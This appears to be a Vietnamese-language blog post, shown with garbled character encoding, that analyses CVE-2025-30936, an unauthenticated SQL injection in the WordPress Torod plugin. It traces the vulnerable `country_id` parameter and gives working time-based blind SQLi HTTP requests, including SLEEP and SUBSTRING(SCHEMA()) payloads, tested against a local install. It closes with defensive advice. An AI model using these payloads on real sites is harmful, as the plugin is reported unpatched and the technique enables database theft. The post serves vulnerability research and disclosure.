---
title: CVE-2025-30936 Analysis & POC
description: Security Vulnerability in WordPress Torod Plugin.
date: 2025-09-28 20:51:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, sqli]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

Lá»— há»•ng xáº£y ra trÃªn plugin **Torod** cá»§a WordPress. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.

* **CVE ID**: [CVE-2025-30936](https://www.cve.org/CVERecord?id=CVE-2025-30936)
* **Product**: [WordPress Torod Plugin](https://wordpress.org/plugins/torod/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: <= 1.9
* **Fixed in**: <= N/A
* **CVSS severity**:  High (9.3)
* **Required Privilege**: Unauthenticated

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Torod**: v1.9

## Analysis

NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« **POST** request vÃ o SQL query mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ quáº£n kiá»ƒm soÃ¡t cháº·t cháº½.

### Vulnerable Sink

CVE nÃ y khÃ´ng cÃ³ báº£n vÃ¡ nÃªn khÃ´ng thá»ƒ sá»­ dá»¥ng **diff tool** Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a **code lá»—i** vÃ  **code Ä‘Ã£ fix lá»—i**.

> Trong WordPress, Ä‘á»ƒ SQLi xáº£y ra, á»©ng dá»¥ng pháº£i tÆ°Æ¡ng tÃ¡c vá»›i database thÃ´ng qua biáº¿n global `$wpdb`, ta search tá»« khÃ³a nÃ y trong thÆ° má»¥c cá»§a plugin Ä‘á»ƒ tÃ¬m sink.

{{< figure src="search_sink.png" caption="TÃ¬m vá»‹ trÃ­ sink trong code" alt="Search sink" >}}

ğŸ‘‰ Dá»¯ liá»‡u tá»« `$_POST['country_id']` Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o truy váº¥n SQL mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ kiá»ƒm soÃ¡t há»£p lá»‡. Viá»‡c chá»‰ sá»­ dá»¥ng `sanitize_text_field()` má»›i dá»«ng láº¡i á»Ÿ má»©c **escape chuá»—i**, chá»© khÃ´ng Ä‘áº£m báº£o tÃ­nh an toÃ n. Do Ä‘Ã³, lá»— há»•ng SQLi cÃ³ thá»ƒ xáº£y ra.

* Source: `$_POST['country_id']`
* Sink: `$wpdb->get_results("SELECT * FROM $table_name WHERE country_id = $country_id")`

### How it work?

Lá»— há»•ng náº±m trong hÃ m `get_regions_and_cities` cá»§a class `ajaxyk` thuá»™c file **inc/ajaxyk.php**. Äá»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i nÃ³ Ä‘Æ°á»£c gá»i, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a `get_regions_and_cities` trong thÆ° má»¥c chá»©a plugin.

{{< figure src="search_1.png" caption="TÃ¬m vá»‹ trÃ­ hÃ m get_regions_and_cities" alt="Search 1" >}}

ğŸ‘‰ `get_regions_and_cities` Ä‘Æ°á»£c construct cá»§a class `ajaxyk` gá»i lÃ m callback cá»§a 2 action hook thÃ´ng qua hÃ m `add_action`

* `wp_ajax_get_regions_and_cities`

  * ÄÆ°á»£c viáº¿t theo cÃº phÃ¡p `wp_ajax_{$action}`
  * YÃªu cáº§u ngÆ°á»i dÃ¹ng Ä‘Äƒng nháº­p

* `wp_ajax_nopriv_get_regions_and_cities`

  * ÄÆ°á»£c viáº¿t theo cÃº phÃ¡p `wp_ajax_nopriv_{$action}`
  * KhÃ´ng yÃªu cáº§u ngÆ°á»i dÃ¹ng Ä‘Äƒng nháº­p

VÃ¬ Ä‘Ã¢y lÃ  lá»— há»•ng **unauthenticated** nÃªn ta chá»‰ quan tÃ¢m tá»›i hook `wp_ajax_nopriv_get_regions_and_cities`.

NhÆ° váº­y khi gá»­i **POST** request Ä‘áº¿n `/wp-admin/admin-ajax.php` vá»›i tham sá»‘

```http
action=wp_ajax_nopriv_get_regions_and_cities&country_id=payload_here
```

* Callback `get_regions_and_cities` Ä‘Æ°á»£c gá»i.
* `country_id` Ä‘Æ°á»£c láº¥y trá»±c tiáº¿p tá»« request vÃ  chÃ¨n vÃ o SQL query.
* Query thá»±c thi vá»›i payload Ä‘á»™c háº¡i.

## Exploit

### Detect SQLi

Gá»­i **POST request** chá»©a payload SQLi.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=get_regions_and_cities&country_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

Khi Ä‘Ã³ cÃ¢u query sáº½ trá»Ÿ thÃ nh:

```sql
SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a)
```

{{< figure src="time_resp.png" caption="Káº¿t quáº£ pháº£n há»“i thá»i gian" alt="Responsed time" >}}

ğŸ‘‰ Dá»±a trÃªn thá»i gian pháº£n há»“i => payload hoáº¡t Ä‘á»™ng.

**CÃ¡c technique cÃ³ thá»ƒ sá»­ dá»¥ng trong trÆ°á»ng há»£p table rá»—ng**:

* **UNION**: vÃ¬ nÃ³ khÃ´ng phá»¥ thuá»™c vÃ o dá»¯ liá»‡u báº£ng cá»§a cÃ¢u query trÆ°á»›c Ä‘Ã³, nhÆ°ng cáº§n pháº£i tÃ¬m Ä‘Æ°á»£c sá»‘ cá»™t tÆ°Æ¡ng á»©ng.
* **Subquery**:

  * **Subquery trong má»‡nh Ä‘á» WHERE**: MySQL cÃ³ thá»ƒ tá»‘i Æ°u hÃ³a vÃ  bá» qua subquery náº¿u káº¿t quáº£ cÃ³ thá»ƒ xÃ¡c Ä‘á»‹nh sá»›m. Náº¿u báº£ng khÃ´ng cÃ³ dá»¯ liá»‡u, káº¿t quáº£ cuá»‘i cÃ¹ng sáº½ lÃ  táº­p rá»—ng, MySQL khÃ´ng cáº§n thá»±c thi `SLEEP()`.
  * **Subquery trong má»‡nh Ä‘á» FROM**: Truy váº¥n con Ä‘Æ°á»£c coi lÃ  báº£ng táº¡m thá»i. MySQL pháº£i thá»±c thi truy váº¥n con nÃ y Ä‘áº§u tiÃªn Ä‘á»ƒ táº¡o báº£ng táº¡m thá»i, sau Ä‘Ã³ má»›i thá»±c thi truy váº¥n chÃ­nh.

{{< figure src="https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png" caption="Thá»© tá»± thá»±c thi truy váº¥n SQL" alt="SQL Excution Order" >}}

### Get First Letter of Database Name

Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ **dump Ä‘Æ°á»£c háº¿t data** lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ gáº§n nhÆ° toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.

Gá»­i request vá»›i **SQLi payload**:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=get_regions_and_cities=1&country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)
```

Sá»­ dá»¥ng `SUBSTRING()` Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a **database name**, `IF()` tráº£ vá» `SLEEP(5)` náº¿u kÃ½ tá»± Ä‘Ã³ lÃ  `0x77`('w')

Sá»­ dá»¥ng hex encoding `w` thÃ nh `0x77` vÃ¬ `country_id` Ä‘Æ°á»£c láº¥y tá»« **POST** request trong nÃªn bá»‹ escape bá»Ÿi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress vÃ  bá»Ÿi `sanitize_text_field`.

ğŸ‘‰ Dá»±a trÃªn thá»i gian pháº£n há»“i => kÃ­ tá»± Ä‘áº§u tiÃªn Ä‘Ãºng lÃ  `w`.

## Conclusion

Lá»— há»•ng **CVE-2025-30936** trong plugin WordPress **Torod** tá»« phiÃªn báº£n **1.9** trá»Ÿ láº¡i, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.

ChÆ°a cÃ³ báº£n vÃ¡ chÃ­nh thá»±c nÃ o cho lá»— há»•ng nÃ y.

**Key takeaways**:

* Kiá»ƒm soÃ¡t ká»¹ input tá»« ngÆ°á»i dÃ¹ng.
* LuÃ´n sá»­ dá»¥ng `$wpdb->prepare()` khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection.
* ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Torod Plugin <= 1.9 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/torod/vulnerability/wordpress-torod-1-9-sql-injection-vulnerability?_s_id=cve)
